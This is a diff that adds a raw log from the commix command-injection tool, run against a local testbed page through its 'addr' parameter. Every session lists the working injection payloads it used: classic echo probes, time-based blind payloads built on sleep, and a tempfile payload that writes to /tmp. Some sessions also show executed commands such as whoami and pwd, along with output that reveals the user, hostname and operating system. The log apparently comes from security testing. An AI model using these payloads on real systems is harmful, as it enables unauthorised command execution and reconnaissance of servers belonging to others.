@@ -1,0 +1,73 @@
+=====================================
+| Started in 05/02/2022 at 19:53:07 |
+=====================================
+[info] Tested URL : http://localhost:3000/commix-testbed/scenarios/regular/GET/classic.php?addr=INJECT_HERE
+[info] Type: Results-Based Os Command Injection
+[info] Technique: Classic Command Injection Technique
+[info] Parameter: (GET) addr
+[info] Used payload: %0aecho YKYCAS$((12%2B10))$(echo YKYCAS)YKYCAS;
+[info] Executed command: whoami
+[info] Execution output: www-data
+[info] Executed command: pwd
+[info] Execution output: /var/www/example.com/public_html/commix-testbed/scenarios/regular/GET
+
+=====================================
+| Started in 05/02/2022 at 19:55:05 |
+=====================================
+[info] Tested URL : http://localhost:3000/commix-testbed/scenarios/regular/GET/classic.php?addr=INJECT_HERE
+[info] Type: Results-Based Os Command Injection
+[info] Technique: Classic Command Injection Technique
+[info] Parameter: (GET) addr
+[info] Used payload: %0aecho YKYCAS$((12%2B10))$(echo YKYCAS)YKYCAS;
+[info] The hostname is 8d60eb58a36f.
+[info] The current user is www-data and it is not privileged.
+
+=====================================
+| Started in 05/02/2022 at 19:55:26 |
+=====================================
+[info] Tested URL : http://localhost:3000/commix-testbed/scenarios/regular/GET/classic.php?addr=INJECT_HERE
+[info] Type: Results-Based Os Command Injection
+[info] Technique: Classic Command Injection Technique
+[info] Parameter: (GET) addr
+[info] Used payload: %0aecho EZJGJQ$((76%2B86))$(echo EZJGJQ)EZJGJQ;
+[info] The hostname is 8d60eb58a36f.
+[info] The current user is www-data and it is not privileged.
+
+=====================================
+| Started in 05/02/2022 at 19:56:17 |
+=====================================
+[info] Tested URL : http://localhost:3000/commix-testbed/scenarios/regular/GET/classic.php?addr=INJECT_HERE
+[info] Type: Results-Based Os Command Injection
+[info] Technique: Classic Command Injection Technique
+[info] Parameter: (GET) addr
+[info] Used payload: %0aecho EKNXMA$((80%2B1))$(echo EKNXMA)EKNXMA;
+[info] The hostname is 8d60eb58a36f.
+[info] The current user is www-data and it is not privileged.
+[info] The target operating system is Linux (Ubuntu 14.04) and the hardware platform is x86_64.
+
+[info] Type: Blind Os Command Injection
+[info] Technique: Time-Based Command Injection Technique
+[info] Parameter: (GET) addr
+[info] Used payload: %0astr=$(echo ABYEAK)%0astr1=$(expr length "$str")%0aif [ 6 != $str1 ]%0athen sleep 0%0aelse sleep 1%0afi ;
+[info] The hostname is 8d60eb58a36f.
+[info] The current user is www-data and it is not privileged.
+[info] The target operating system is Linux (Linux (Ubuntu 14.04)) and the hardware platform is x86_64.
+[info] Used payload: ;str=$(echo VFMUEV);str1=$(expr length "$str");if [ 6 != $str1 ];then sleep 0;else sleep 1;fi &
+[info] The hostname is 8d60eb58a36f.
+[info] The current user is www-data and it is not privileged.
+[info] The target operating system is Linux (Linux (Ubuntu 14.04)) and the hardware platform is x86_64.
+[info] Used payload: %26sleep 0 %26%26str=$(echo MBMLGY)%26%26str1=$(expr length "$str")%26%26[ 6 -eq $str1 ]%26%26sleep 1&
+
+[info] Type: Semi-Blind Command Injection
+[info] Technique: Tempfile-Based Injection Technique
+[info] Parameter: (GET) addr
+[info] Used payload: %0astr=$(echo UIKVAH>/tmp/UIKVAH.txt)%0astr=$(cat /tmp/UIKVAH.txt)%0astr1=$(expr length "$str")%0aif [ 6 -ne ${str1} ]%0athen sleep 0%0aelse sleep 1%0afi ;
+
+=====================================
+| Started in 05/02/2022 at 20:06:47 |
+=====================================
+[info] Tested URL : http://localhost:3000/commix-testbed/scenarios/regular/GET/classic.php?addr=INJECT_HERE
+[info] Type: Results-Based Os Command Injection
+[info] Technique: Classic Command Injection Technique
+[info] Parameter: (GET) addr
+[info] Used payload: ';echo ESQFQP$((80%2B24))$(echo ESQFQP)ESQFQP//
